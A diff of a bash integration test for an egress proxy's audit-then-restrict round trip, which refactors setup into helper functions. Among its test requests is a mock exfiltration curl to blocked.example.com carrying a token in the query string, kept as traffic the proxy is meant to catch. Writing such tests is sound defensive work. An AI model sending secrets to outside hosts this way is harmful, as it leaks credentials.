@@ -17,43 +17,26 @@
 # traffic, so leaving ALLOWED_TLS_RULES set in phase 2 would leak that line
 # into the extracted allowed_url_rules text and break the phase outright.
 set -uo pipefail
-source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
+source "$(dirname "${BASH_SOURCE[0]}")/driver-helpers.sh"
 
-REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-
-: "${BUILDCAGE_LOCAL_IMAGE_REF:?BUILDCAGE_LOCAL_IMAGE_REF must be set to a locally built inspect-engine image (BUILDCAGE_TEST_HOOKS=1 PROXY_ENGINE=inspect docker compose build proxy)}"
+require_local_image inspect
 
 echo ""
 echo "=== Inspect Engine Integration Test (audit -> restrict round trip) ==="
 echo ""
 
-echo "--- bringing up fixture origins (compose.test-inspect.yaml) ---"
-cleanup() {
-  docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" down -v >/dev/null 2>&1 || true
-}
-trap cleanup EXIT
-docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" up -d --build --wait
+trap 'fixture_down inspect' EXIT
+fixture_up inspect
 
 TMPDIR=$(mktemp -d)
-touch "$TMPDIR/state.env"
 
 echo ""
 echo "=== Phase 1: learn the rules from an audit run ==="
 
-AUDIT_SUMMARY="$TMPDIR/audit-summary.md"
-touch "$AUDIT_SUMMARY"
-
-GITHUB_WORKSPACE="$TMPDIR" \
-GITHUB_STATE="$TMPDIR/state.env" \
-GITHUB_STEP_SUMMARY="$AUDIT_SUMMARY" \
-BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$AUDIT_SUMMARY" \
-BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
-BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
-BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
-INPUT_PROXY_ENGINE="inspect" \
-INPUT_PROXY_MODE="audit" \
-INPUT_ALLOWED_TLS_RULES="tlspass.example.com:443" \
-INPUT_RUN="
+run_step inspect "$TMPDIR/audit" \
+  INPUT_PROXY_MODE="audit" \
+  INPUT_ALLOWED_TLS_RULES="tlspass.example.com:443" \
+  INPUT_RUN="
 S='curl -sS --max-time 10'
 \$S https://allowed.example.com/public/pkg.tgz
 \$S https://allowed.example.com/public/a/one.tgz
@@ -63,10 +46,9 @@ S='curl -sS --max-time 10'
 \$S https://allowed.example.com:9443/private/secret
 \$S \"https://blocked.example.com/exfil?token=SECRET-VALUE\"
 \$S --insecure https://tlspass.example.com/public/x
-true" \
-  node "$REPO_ROOT/dist/main.cjs" >"$TMPDIR/audit-out.log" 2>&1
+true"
 AUDIT_EXIT=$?
-cat "$TMPDIR/audit-out.log"
+cat "$TMPDIR/audit.log"
 
 echo ""
 echo "--- audit-phase exit code: $AUDIT_EXIT ---"
@@ -76,7 +58,7 @@ else
   fail "the audit-phase step failed (should never refuse anything)"
 fi
 
-SUMMARY=$(cat "$AUDIT_SUMMARY")
+SUMMARY=$(cat "$TMPDIR/audit.md")
 
 echo ""
 echo "[report] allowed_tls_rules is echoed as configured, not derived from traffic:"
@@ -111,25 +93,14 @@ sed 's/^/    /' <<< "$RULES"
 echo ""
 echo "=== Phase 2: enforce them, unedited ==="
 
-RESTRICT_SUMMARY="$TMPDIR/restrict-summary.md"
-touch "$RESTRICT_SUMMARY"
-
-GITHUB_WORKSPACE="$TMPDIR" \
-GITHUB_STATE="$TMPDIR/state.env" \
-GITHUB_STEP_SUMMARY="$RESTRICT_SUMMARY" \
-BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$RESTRICT_SUMMARY" \
-BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
-BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
-BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
-INPUT_PROXY_ENGINE="inspect" \
-INPUT_PROXY_MODE="restrict" \
-INPUT_ALLOWED_URL_RULES="$RULES" \
-INPUT_ALLOWED_TLS_RULES="" \
-INPUT_FAIL_ON_BLOCKED="false" \
-INPUT_RUN="bash $REPO_ROOT/test/inspect-roundtrip-scenarios.sh" \
-  node "$REPO_ROOT/dist/main.cjs" >"$TMPDIR/restrict-out.log" 2>&1
+run_step inspect "$TMPDIR/restrict" \
+  INPUT_PROXY_MODE="restrict" \
+  INPUT_ALLOWED_URL_RULES="$RULES" \
+  INPUT_ALLOWED_TLS_RULES="" \
+  INPUT_FAIL_ON_BLOCKED="false" \
+  INPUT_RUN="bash $REPO_ROOT/test/inspect-roundtrip-scenarios.sh"
 RESTRICT_EXIT=$?
-cat "$TMPDIR/restrict-out.log"
+cat "$TMPDIR/restrict.log"
 
 echo ""
 echo "--- restrict-phase exit code: $RESTRICT_EXIT ---"
